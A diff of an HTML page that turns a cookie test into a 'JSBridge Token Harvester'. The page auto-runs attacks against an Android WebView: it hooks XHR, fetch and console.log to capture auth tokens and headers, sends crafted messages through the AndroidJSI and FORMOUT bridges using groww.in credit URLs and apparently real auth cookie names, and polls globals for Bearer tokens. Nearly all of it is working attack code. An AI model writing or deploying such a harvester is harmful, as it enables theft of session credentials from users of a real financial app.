@@ -1,84 +1,268 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Simple Cookie Test</title>
+    <title>JSBridge Token Harvester</title>
     <style>
         body { font-family: Arial; padding: 20px; background: #000; color: #00ff00; }
-        .result { border: 2px solid #ff0000; padding: 15px; margin: 10px 0; background: #111; }
-        pre { background: #222; color: #fff; padding: 10px; overflow-x: auto; }
+        .attack { border: 2px solid #ff0000; padding: 15px; margin: 10px 0; background: #111; }
+        .success { border-color: #00ff00; background: #003300; }
+        button { background: #ff0000; color: white; padding: 15px; border: none; margin: 5px; cursor: pointer; }
+        pre { background: #222; color: #fff; padding: 10px; overflow-x: auto; font-size: 12px; }
+        .log { background: #000; color: #00ff00; padding: 10px; font-family: monospace; max-height: 200px; overflow-y: auto; }
     </style>
 </head>
 <body>
-    <h1>🍪 Cookie Access Test</h1>
-    <button onclick="testCookies()">🚀 Test Cookie Access</button>
+    <h1>🔓 JSBridge Token Harvester</h1>
+    <p>Attempting to extract tokens via JSBridge manipulation...</p>
+    
+    <button onclick="triggerTokenRefresh()">🔄 Trigger Token Refresh</button>
+    <button onclick="interceptWebViewData()">🕵️ Intercept WebView Data</button>
+    <button onclick="manipulateFormData()">📋 Manipulate Form Processing</button>
+    <button onclick="triggerSessionActions()">⚡ Trigger Session Actions</button>
+    
+    <div id="log" class="log">
+        <div>🚀 JSBridge Token Harvester Ready...</div>
+    </div>
+    
     <div id="results"></div>
 
     <script>
-        function testCookies() {
-            const results = document.getElementById('results');
-            results.innerHTML = '';
+        let logContainer = document.getElementById('log');
+        let resultsContainer = document.getElementById('results');
+        let harvested = {};
+        
+        function log(message) {
+            const timestamp = new Date().toLocaleTimeString();
+            logContainer.innerHTML += `<div>[${timestamp}] ${message}</div>`;
+            logContainer.scrollTop = logContainer.scrollHeight;
+            console.log(message);
+        }
+        
+        function addResult(title, content, className = 'attack') {
+            const div = document.createElement('div');
+            div.className = className;
+            div.innerHTML = `<h3>${title}</h3><div>${content}</div>`;
+            resultsContainer.appendChild(div);
+        }
+
+        // 1. Try to trigger token refresh/update which might expose tokens
+        function triggerTokenRefresh() {
+            log("🔄 Attempting to trigger token refresh...");
             
-            // Test 1: Direct cookie access
-            const cookies = document.cookie;
-            const div1 = document.createElement('div');
-            div1.className = 'result';
-            div1.innerHTML = `
-                <h3>🍪 Document.cookie Access</h3>
-                <p>Length: ${cookies.length}</p>
-                <pre>${cookies || 'No cookies accessible'}</pre>
-                <p>URL: ${location.href}</p>
-                <p>Domain: ${location.hostname}</p>
-            `;
-            results.appendChild(div1);
+            const refreshActions = [
+                'ACCESS_TOKEN_REFRESH_TOKEN_UPDATE',
+                'SESSION_EXPIRED',
+                'TWO_FACTOR_EXPIRE'
+            ];
             
-            // Test 2: Try to set a test cookie
-            try {
-                document.cookie = "test_cookie=malicious_value; path=/";
-                const testRead = document.cookie;
-                const div2 = document.createElement('div');
-                div2.className = 'result';
-                div2.innerHTML = `
-                    <h3>🔧 Cookie Write Test</h3>
-                    <p>After setting test cookie:</p>
-                    <pre>${testRead}</pre>
-                `;
-                results.appendChild(div2);
-            } catch (e) {
-                const div2 = document.createElement('div');
-                div2.className = 'result';
-                div2.innerHTML = `<h3>❌ Cookie Write Failed</h3><p>${e.message}</p>`;
-                results.appendChild(div2);
-            }
-            
-            // Test 3: Check for specific auth tokens in any accessible data
-            const authTokens = ['lhtndhgfd', 'arkeyt473rfh7834cd', 'AUTH_SESSION_ID'];
-            let foundTokens = [];
-            
-            authTokens.forEach(token => {
-                if (cookies.includes(token)) {
-                    foundTokens.push(token);
+            refreshActions.forEach(action => {
+                try {
+                    if (window.AndroidJSI) {
+                        const payload = JSON.stringify({
+                            action: action,
+                            data: "token_harvest_attempt"
+                        });
+                        
+                        // Override console.log to catch any token responses
+                        const originalLog = console.log;
+                        console.log = function(...args) {
+                            originalLog.apply(console, args);
+                            args.forEach(arg => {
+                                if (typeof arg === 'string' && (arg.includes('Bearer') || arg.includes('token'))) {
+                                    log(`🎯 Potential token intercepted: ${arg.substring(0, 50)}...`);
+                                    harvested[`console_${Date.now()}`] = arg;
+                                }
+                            });
+                        };
+                        
+                        window.AndroidJSI.onReceiveMessage(payload);
+                        log(`✅ Sent ${action} via AndroidJSI`);
+                    }
+                } catch (e) {
+                    log(`❌ ${action} failed: ${e.message}`);
                 }
             });
             
-            if (foundTokens.length > 0) {
-                const div3 = document.createElement('div');
-                div3.className = 'result';
-                div3.style.borderColor = '#00ff00';
-                div3.innerHTML = `
-                    <h3>🚨 AUTH TOKENS FOUND!</h3>
-                    <p>Found tokens: ${foundTokens.join(', ')}</p>
-                `;
-                results.appendChild(div3);
+            addResult("Token Refresh Attempts", "Triggered multiple refresh actions via JSBridge");
+        }
+
+        // 2. Try to intercept webview data by manipulating the flow
+        function interceptWebViewData() {
+            log("🕵️ Setting up data interception...");
+            
+            // Override XMLHttpRequest to catch API calls
+            const originalXHR = window.XMLHttpRequest;
+            window.XMLHttpRequest = function() {
+                const xhr = new originalXHR();
+                const originalOpen = xhr.open;
+                const originalSend = xhr.send;
+                
+                xhr.open = function(method, url, ...args) {
+                    log(`🌐 XHR Request: ${method} ${url}`);
+                    return originalOpen.apply(this, arguments);
+                };
+                
+                xhr.send = function(data) {
+                    if (data && (data.includes('token') || data.includes('auth'))) {
+                        log(`🎯 Auth data in XHR: ${data.substring(0, 100)}...`);
+                        harvested[`xhr_${Date.now()}`] = data;
+                    }
+                    return originalSend.apply(this, arguments);
+                };
+                
+                return xhr;
+            };
+            
+            // Override fetch as well
+            if (window.fetch) {
+                const originalFetch = window.fetch;
+                window.fetch = function(url, options = {}) {
+                    log(`🌐 Fetch Request: ${url}`);
+                    
+                    if (options.body && (options.body.includes('token') || options.body.includes('auth'))) {
+                        log(`🎯 Auth data in fetch: ${options.body.substring(0, 100)}...`);
+                        harvested[`fetch_${Date.now()}`] = options.body;
+                    }
+                    
+                    if (options.headers) {
+                        Object.keys(options.headers).forEach(header => {
+                            if (header.toLowerCase().includes('auth') || header.toLowerCase().includes('token')) {
+                                log(`🎯 Auth header: ${header} = ${options.headers[header]}`);
+                                harvested[`header_${header}`] = options.headers[header];
+                            }
+                        });
+                    }
+                    
+                    return originalFetch.apply(this, arguments);
+                };
             }
             
-            console.log('Cookie test completed');
-            console.log('Cookies:', cookies);
-            console.log('Location:', location.href);
+            addResult("Network Interception", "Set up XHR and Fetch interception for auth data");
         }
-        
-        // Auto-run on load
+
+        // 3. Try to manipulate form data processing to extract tokens
+        function manipulateFormData() {
+            log("📋 Attempting form data manipulation...");
+            
+            try {
+                if (window.FORMOUT) {
+                    // Try different URLs that might trigger different processing
+                    const testUrls = [
+                        "https://credit.groww.in/exit",
+                        "https://groww.in/credit",
+                        "https://credit.groww.in/help/credit"
+                    ];
+                    
+                    testUrls.forEach(url => {
+                        // Try to trigger form processing with various auth-like data
+                        const testFormData = [
+                            "authToken=extract_this&sessionId=get_this",
+                            "lhtndhgfd=token123&arkeyt473rfh7834cd=2fa456",
+                            "username=test&password=test&token=harvest"
+                        ];
+                        
+                        testFormData.forEach((data, index) => {
+                            try {
+                                window.FORMOUT.processFormData(url, data);
+                                log(`✅ Form data sent to ${url}: ${data.substring(0, 30)}...`);
+                            } catch (e) {
+                                log(`❌ Form processing failed for ${url}: ${e.message}`);
+                            }
+                        });
+                    });
+                }
+            } catch (e) {
+                log(`❌ Form manipulation failed: ${e.message}`);
+            }
+            
+            addResult("Form Data Manipulation", "Attempted various form processing attacks");
+        }
+
+        // 4. Try to trigger various session-related actions that might expose data
+        function triggerSessionActions() {
+            log("⚡ Triggering session-related actions...");
+            
+            const sessionActions = [
+                'WEBVIEW_INTERACTABLE',
+                'WEBVIEW_SUCCESS',
+                'WEBVIEW_FAILURE',
+                'DEEPLINK',
+                'SHARE',
+                'EXTERNAL_AP_LINK'
+            ];
+            
+            sessionActions.forEach(action => {
+                try {
+                    if (window.AndroidJSI) {
+                        const payload = JSON.stringify({
+                            action: action,
+                            data: JSON.stringify({
+                                testData: "harvest_attempt",
+                                url: location.href,
+                                extractTokens: true
+                            })
+                        });
+                        
+                        window.AndroidJSI.onReceiveMessage(payload);
+                        log(`✅ Triggered ${action}`);
+                    }
+                } catch (e) {
+                    log(`❌ ${action} failed: ${e.message}`);
+                }
+            });
+            
+            addResult("Session Actions", "Triggered multiple session-related JSBridge actions");
+        }
+
+        // Monitor for any global variable changes that might indicate token updates
+        function monitorGlobalChanges() {
+            log("👀 Monitoring global variable changes...");
+            
+            const originalKeys = Object.keys(window);
+            
+            setInterval(() => {
+                const currentKeys = Object.keys(window);
+                const newKeys = currentKeys.filter(key => !originalKeys.includes(key));
+                
+                newKeys.forEach(key => {
+                    const value = window[key];
+                    if (typeof value === 'string' && (value.includes('Bearer') || value.includes('token'))) {
+                        log(`🎯 New global with token: window.${key} = ${value.substring(0, 30)}...`);
+                        harvested[`global_${key}`] = value;
+                    }
+                    originalKeys.push(key);
+                });
+            }, 1000);
+        }
+
+        // Display harvested data
+        function showHarvestedData() {
+            if (Object.keys(harvested).length > 0) {
+                addResult("🚨 HARVESTED DATA", 
+                    `<pre>${JSON.stringify(harvested, null, 2)}</pre>`, 'success');
+                log(`🎯 Total harvested items: ${Object.keys(harvested).length}`);
+            } else {
+                log("❌ No tokens harvested yet");
+            }
+        }
+
+        // Auto-start
         window.addEventListener('load', function() {
-            setTimeout(testCookies, 1000);
+            log("🔓 JSBridge Token Harvester loaded");
+            log(`🎯 Target: ${location.href}`);
+            
+            // Start monitoring
+            monitorGlobalChanges();
+            
+            // Auto-trigger some attacks
+            setTimeout(() => {
+                log("🚀 Starting automated attacks...");
+                interceptWebViewData();
+                setTimeout(() => triggerTokenRefresh(), 1000);
+                setTimeout(() => triggerSessionActions(), 2000);
+                setTimeout(() => manipulateFormData(), 3000);
+                setTimeout(() => showHarvestedData(), 5000);
+            }, 2000);
         });
     </script>
 </body>
